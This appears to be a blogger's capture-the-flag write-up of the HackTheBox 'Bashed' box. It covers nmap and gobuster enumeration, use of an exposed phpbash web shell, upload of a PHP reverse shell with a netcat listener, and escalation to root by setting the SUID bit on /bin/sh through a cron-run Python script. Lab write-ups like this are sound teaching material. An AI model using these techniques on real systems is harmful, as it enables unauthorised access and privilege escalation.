---
title: "HackTheBox - Bashed"
author: Nasrallah
description: ""
date: 2022-08-19 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, cronjob, python, web, php]
img_path: /assets/img/hackthebox/machines/bashed
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Bashed](https://app.hackthebox.com/machines/Bashed) from [HackTheBox](https://www.hackthebox.com). The box is running a webserver that we scan for files and we find an important one that give us access to the machine. A cronjob running every minute makes it easy for us to get root.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.68
Host is up (0.14s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

There is only 1 open port and it's running Apache web server on an Ubuntu machine.

## Web

Let's navigate to the web server.

![](1.png)

The website is about something called `phpbash` which is, according to the [author's description](https://github.com/Arrexel/phpbash), a standalone, semi-interactive web shell.

Nothing else can be found useful except for the single.html page which contains example of `phpbash`.

## Gobuster

Let's run a directory scan. `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.68/`

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/20 05:09:42 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 295]
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/index.html           (Status: 200) [Size: 7743]                                
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]    
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]   
/server-status        (Status: 403) [Size: 299]                                 
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
===============================================================
```

We found two interesting directories, **/dev** and **/uploads**. The latter one seems to be empty but the **/dev** directory contains the following:

![](2.png)

We found the `phpbash.php` file, and if we click on it, it does give us what it claims; a web shell.

![](3.png)

# **Foothold**

Knowing that we have command execution on the target, i though of uploading a php reverse shell to the server.

I moved to the **/uploads** directory because it is writeable, then i set up a python http server with the command `sudo python3 -m http.server 80` that served [Pentest Monkey's](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) php reverse shell code, then went to the web shell and uploaded the file. 

>Change the ip variable in the code to you tun0 ip.

![](4.png)

Now we set up a listener `nc -lvnp 1234` and request the file to get a shell.

![](5.png)

As a good practice, i stabilized my shell using python pty.

![](6.png)

# **Privilege Escalation**

Let's check our privileges with `sudo -l`.

![](7.png)

We can run any command as `scriptmanager`. We can run the following command to get a shell as the user *scriptmanager*.

```bash
sudo -u scriptmanager /bin/bash
```

![](8.png)

After some enumeration, we found a unusual directory in root.

![](9.png)

Let's see what's there.

![](10.png)

We found 2 files, a python script named `test.py` owned by our current user (**scriptmanager**), and a text file named `test.txt` owned by root and has been modified in the last minute and the python script is the on responsible for that. This means that there is a cronjob running `test.py` regularly.

Since we are the owner of the python script, we can add a script to it that would give us root shell. We can use the following script.

```python
import os; os.system("chmod +s /bin/sh")
```

This script gives the /bin/sh file the `suid` bit which permits us to run it as root.
>the /bin/sh is a shell, just like /bin/bash or /bin/zsh, that's why we choose it.

![](11.png)

Nice! We got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).